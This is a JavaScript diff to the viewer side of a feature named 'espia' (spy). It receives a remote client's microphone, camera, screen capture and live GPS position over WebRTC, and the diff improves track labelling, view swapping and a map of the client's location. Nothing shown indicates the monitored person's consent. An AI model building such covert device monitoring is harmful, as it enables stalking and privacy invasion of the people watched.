@@ -27872,40 +27872,21 @@ const MOS = (() => {
     // se trataba como cámara y 'pantalla' quedaba esperando para siempre.
     // Fix: usar track.getSettings().displaySurface (solo existe en
     // getDisplayMedia tracks) + fallback al label.
+    // [v2.43.91] Identificación robusta de tracks. Tres niveles de evidencia:
+    //   1. trackTipoMap recibido por DataChannel 'gps' (mensaje __meta)
+    //   2. track.contentHint propagado vía SDP ('detail'=pantalla, 'motion'=cam)
+    //   3. fallback heurístico por label (legacy)
+    // El primer track que llega puede no tener mapping todavía → asignamos por
+    // contentHint y reasignamos cuando llegue el __meta. Por eso guardamos
+    // referencias a ev.streams[0] junto al trackId para poder rebalancear.
+    _espiaV2._tracksRecibidos = _espiaV2._tracksRecibidos || []; // [{trackId, stream, kind}]
     pc.ontrack = (ev) => {
       const stream = ev.streams[0];
       const track  = ev.track;
-      const label  = (track.label || '').toLowerCase();
-      let tipo = 'audio';
-      if (track.kind === 'video') {
-        let esPantalla = false;
-        try {
-          const s = track.getSettings ? track.getSettings() : {};
-          // displaySurface = 'monitor' | 'window' | 'browser' | 'application'
-          // Solo getDisplayMedia define esa property
-          if (s.displaySurface || s.logicalSurface !== undefined) esPantalla = true;
-        } catch(_){}
-        // Fallback: label contiene 'screen'/'display'/'web-contents'
-        if (!esPantalla) {
-          esPantalla = label.indexOf('screen') >= 0 ||
-                       label.indexOf('display') >= 0 ||
-                       label.indexOf('web-contents') >= 0;
-        }
-        tipo = esPantalla ? 'pantalla' : 'camara';
-        console.log('[espia ontrack] kind=video label="' + track.label + '" → tipo=' + tipo + ' (displaySurface=' + (track.getSettings?.()?.displaySurface || '?') + ')');
-      }
-      _espiaV2.streams[tipo] = stream;
+      _espiaV2._tracksRecibidos.push({ trackId: track.id, stream, kind: track.kind, contentHint: track.contentHint });
+      _espiaV2AsignarTrack({ trackId: track.id, stream, kind: track.kind, contentHint: track.contentHint });
       _espiaSfx('chime');
       _espiaV2RenderModal();
-      _espiaV2ActualizarStream(tipo, stream);
-      _espiaApiPost('espiaReportarStreams', {
-        sesionId: _espiaV2.sesionId,
-        streams: {
-          audio:    !!_espiaV2.streams.audio,
-          camara:   !!_espiaV2.streams.camara,
-          pantalla: !!_espiaV2.streams.pantalla
-        }
-      }).catch(()=>{});
     };
     // [v2.43.81] DataChannel STUB del lado master para forzar m=application
     // en el SDP offer. Sin esto, el cliente WH creaba un DataChannel 'gps'
@@ -27933,6 +27914,11 @@ const MOS = (() => {
         dc.onmessage = (msg) => {
           try {
             const data = JSON.parse(msg.data);
+            // [v2.43.91] Mensajes meta del cliente (mapping de tracks, etc.)
+            if (data && data.__meta === 'trackMap' && data.map) {
+              _espiaV2AplicarTrackMap(data.map);
+              return;
+            }
             _espiaV2.gpsUlt = data;
             _espiaV2RenderGpsMini();
           } catch(_){}
@@ -28109,6 +28095,61 @@ const MOS = (() => {
     }
   }
 
+  // [v2.43.91] Asigna un track recibido a streams[tipo] según evidencia.
+  function _espiaV2AsignarTrack(info) {
+    if (!_espiaV2) return;
+    let tipo;
+    if (info.kind === 'audio') {
+      tipo = 'audio';
+    } else {
+      // 1) Mapping explícito del DataChannel (más confiable)
+      const mapeado = _espiaV2._trackTipoMap?.[info.trackId];
+      if (mapeado) tipo = mapeado;
+      // 2) contentHint vía SDP (Chrome/Firefox modernos)
+      else if (info.contentHint === 'detail') tipo = 'pantalla';
+      else if (info.contentHint === 'motion') tipo = 'camara';
+      // 3) Default optimista: el primer video que llega suele ser cámara.
+      //    Si llegó otro antes (ya hay streams.camara), este es pantalla.
+      else if (_espiaV2.streams.camara && !_espiaV2.streams.pantalla) tipo = 'pantalla';
+      else tipo = 'camara';
+    }
+    _espiaV2.streams[tipo] = info.stream;
+    console.log('[espia ontrack] trackId=' + String(info.trackId).substring(0,8) + ' contentHint=' + (info.contentHint || '?') + ' → tipo=' + tipo);
+    _espiaV2ActualizarStream(tipo, info.stream);
+    _espiaApiPost('espiaReportarStreams', {
+      sesionId: _espiaV2.sesionId,
+      streams: {
+        audio:    !!_espiaV2.streams.audio,
+        camara:   !!_espiaV2.streams.camara,
+        pantalla: !!_espiaV2.streams.pantalla
+      }
+    }).catch(()=>{});
+  }
+
+  // Cuando el cliente manda mapping por DataChannel, reasignar TODOS los video tracks.
+  function _espiaV2AplicarTrackMap(map) {
+    if (!_espiaV2 || !map) return;
+    _espiaV2._trackTipoMap = Object.assign({}, _espiaV2._trackTipoMap, map);
+    const videos = (_espiaV2._tracksRecibidos || []).filter(t => t.kind === 'video');
+    if (!videos.length) return;
+    // Limpiar y reasignar (solo si alguna asignación cambia)
+    let cambio = false;
+    const nuevosStreams = { camara: null, pantalla: null };
+    videos.forEach(t => {
+      const tipo = map[t.trackId];
+      if (tipo === 'pantalla') nuevosStreams.pantalla = t.stream;
+      else if (tipo === 'camara') nuevosStreams.camara = t.stream;
+      if (_espiaV2.streams[tipo] !== t.stream) cambio = true;
+    });
+    if (cambio) {
+      _espiaV2.streams.camara = nuevosStreams.camara;
+      _espiaV2.streams.pantalla = nuevosStreams.pantalla;
+      console.log('[espia trackMap] reasignado · camara=' + !!nuevosStreams.camara + ' pantalla=' + !!nuevosStreams.pantalla);
+      _espiaV2RenderModal();
+      // setTimeout dentro de RenderModal se encarga de re-vincular los <video>
+    }
+  }
+
   function _espiaV2Cerrar(motivo) {
     if (!_espiaV2) return;
     try { _espiaSfx('whoosh'); } catch(_){}
@@ -28193,21 +28234,32 @@ const MOS = (() => {
               <div id="espiaV2AudioInfo" style="font-size:9px;color:#94a3b8;margin-top:5px;font-family:monospace">esperando…</div>
               <audio id="espiaV2AudioEl" autoplay></audio>
             </div>
-            <!-- Cámara mini (click → swap) -->
-            <div id="espiaV2CamCard" onclick="MOS._espiaV2Swap()" style="background:#0f172a;border:1px solid ${focusEsCamara ? 'rgba(16,185,129,.4)' : 'rgba(99,102,241,.3)'};border-radius:10px;padding:11px;cursor:${focusEsCamara ? 'default' : 'pointer'};transition:all .25s;box-shadow:0 0 18px -8px ${focusEsCamara ? '#10b98144' : '#6366f144'}"
-                 ${focusEsCamara ? '' : `onmouseover="this.style.transform='translateY(-2px)';this.style.boxShadow='0 4px 24px -6px #6366f188'"
-                 onmouseout="this.style.transform='translateY(0)';this.style.boxShadow='0 0 18px -8px #6366f144'"`}>
-              <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
-                <div style="font-size:9px;font-weight:800;color:#a5b4fc;text-transform:uppercase;letter-spacing:.5px">📷 ${focusEsCamara ? 'CÁMARA (focus)' : 'CÁMARA'}</div>
-                ${!focusEsCamara ? '<span style="font-size:8px;color:#64748b">click=swap</span>' : ''}
-              </div>
-              <video id="espiaV2CamMini" autoplay playsinline muted
-                     style="width:100%;height:90px;object-fit:cover;background:#000;border-radius:6px"></video>
-              ${!_espiaV2.streams.camara ? `
-                <div style="position:relative;margin-top:-90px;height:90px;display:flex;align-items:center;justify-content:center;background:#020617;border-radius:6px">
-                  <div style="width:24px;height:24px;border:2px solid rgba(99,102,241,.3);border-top-color:#6366f1;border-radius:50%;animation:espiaSpin 1s linear infinite"></div>
-                </div>` : ''}
-            </div>
+            <!-- Mini card (el OTRO stream — click swap) -->
+            <!-- [v2.43.91] El mini ahora muestra el stream que NO es el focus.
+                 Si focus=pantalla → mini=cámara. Si focus=cámara → mini=pantalla.
+                 Antes el mini era SIEMPRE cámara → al hacer swap a focus=cámara,
+                 grande y mini mostraban lo mismo (cámara) y "pantalla" desaparecía. -->
+            ${(() => {
+              const otro = focusEsCamara ? 'pantalla' : 'camara';
+              const otroIcon = otro === 'pantalla' ? '🖥️' : '📷';
+              const otroLabel = otro === 'pantalla' ? 'PANTALLA' : 'CÁMARA';
+              const otroStream = _espiaV2.streams[otro];
+              const otroColor = otro === 'pantalla' ? '16,185,129' : '99,102,241';
+              return `<div id="espiaV2MiniCard" onclick="MOS._espiaV2Swap()" style="background:#0f172a;border:1px solid rgba(${otroColor},.3);border-radius:10px;padding:11px;cursor:pointer;transition:all .25s;box-shadow:0 0 18px -8px rgba(${otroColor},.28)"
+                onmouseover="this.style.transform='translateY(-2px)';this.style.boxShadow='0 4px 24px -6px rgba(${otroColor},.55)'"
+                onmouseout="this.style.transform='translateY(0)';this.style.boxShadow='0 0 18px -8px rgba(${otroColor},.28)'">
+                <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
+                  <div style="font-size:9px;font-weight:800;color:rgba(${otroColor},.95);text-transform:uppercase;letter-spacing:.5px">${otroIcon} ${otroLabel}</div>
+                  <span style="font-size:8px;color:#64748b">click=swap</span>
+                </div>
+                <video id="espiaV2MiniVideo" autoplay playsinline muted
+                       style="width:100%;height:90px;object-fit:cover;background:#000;border-radius:6px"></video>
+                ${!otroStream ? `
+                  <div style="position:relative;margin-top:-90px;height:90px;display:flex;align-items:center;justify-content:center;background:#020617;border-radius:6px">
+                    <div style="width:24px;height:24px;border:2px solid rgba(${otroColor},.3);border-top-color:rgba(${otroColor},1);border-radius:50%;animation:espiaSpin 1s linear infinite"></div>
+                  </div>` : ''}
+              </div>`;
+            })()}
             <!-- GPS mini -->
             <div style="background:#0f172a;border:1px solid rgba(236,72,153,.3);border-radius:10px;padding:11px;box-shadow:0 0 18px -8px #ec489944">
               <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">
@@ -28246,8 +28298,10 @@ const MOS = (() => {
     document.body.insertAdjacentHTML('beforeend', html);
     // Re-vincular streams a sus video elements
     setTimeout(() => {
+      // [v2.43.91] Big = focus, Mini = el otro (dinámico)
       _espiaV2ActualizarStream(_espiaV2.focus, _espiaV2.streams[_espiaV2.focus]);
-      _espiaV2ActualizarStream('camara_mini', _espiaV2.streams.camara, 'espiaV2CamMini');
+      const otro = _espiaV2.focus === 'camara' ? 'pantalla' : 'camara';
+      _espiaV2ActualizarStream(otro, _espiaV2.streams[otro], 'espiaV2MiniVideo');
       _espiaV2VincularAudio();
       _espiaV2DibujarWaveform();
       _espiaV2RenderGpsMini();
@@ -28303,6 +28357,7 @@ const MOS = (() => {
   function _espiaV2RenderGpsMini() {
     const info = document.getElementById('espiaV2GpsInfo');
     const dot = document.getElementById('espiaV2GpsDot');
+    const mapBox = document.getElementById('espiaV2GpsMap');
     if (!info) return;
     const g = _espiaV2?.gpsUlt;
     if (!g) { info.textContent = 'esperando…'; if (dot) dot.style.background = '#475569'; return; }
@@ -28311,6 +28366,30 @@ const MOS = (() => {
       dot.style.background = '#10b981';
       dot.style.animation = 'espiaBreath 1s';
       setTimeout(() => { if (dot) dot.style.animation = ''; }, 1000);
+    }
+    // [v2.43.91] Minimapa OpenStreetMap embed. Sin dependencias JS, sin CDN extra.
+    // bbox ~150m around point para zoom razonable.
+    if (mapBox && g.lat != null && g.lng != null) {
+      const lat = g.lat, lng = g.lng;
+      const d = 0.0015; // grados ~150m
+      const bbox = `${(lng - d).toFixed(6)},${(lat - d).toFixed(6)},${(lng + d).toFixed(6)},${(lat + d).toFixed(6)}`;
+      const src = `https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&layer=mapnik&marker=${lat.toFixed(6)},${lng.toFixed(6)}`;
+      const iframe = mapBox.querySelector('iframe');
+      if (!iframe) {
+        // Crear iframe primer vez
+        mapBox.innerHTML = `<iframe src="${src}" style="border:0;width:100%;height:100%;border-radius:6px" loading="lazy" referrerpolicy="no-referrer"></iframe>
+          <a href="https://www.openstreetmap.org/?mlat=${lat.toFixed(6)}&mlon=${lng.toFixed(6)}#map=17/${lat.toFixed(6)}/${lng.toFixed(6)}" target="_blank"
+             style="position:absolute;bottom:4px;right:4px;background:rgba(15,23,42,.85);color:#a5b4fc;font-size:8px;padding:2px 5px;border-radius:4px;text-decoration:none;border:1px solid #1e293b">ampliar ↗</a>`;
+        mapBox.style.position = 'relative';
+        mapBox.style.height = '110px';
+        mapBox.style.fontSize = '';
+        mapBox.style.color = '';
+      } else if (!iframe.dataset.lastSrc || Math.abs(parseFloat(iframe.dataset.lastLat || 0) - lat) > 0.0002 || Math.abs(parseFloat(iframe.dataset.lastLng || 0) - lng) > 0.0002) {
+        // Refrescar src solo si movió >20m (evita reload constante por jitter)
+        iframe.src = src;
+        iframe.dataset.lastLat = lat;
+        iframe.dataset.lastLng = lng;
+      }
     }
   }
   function _espiaV2RenderSyncBadge() {
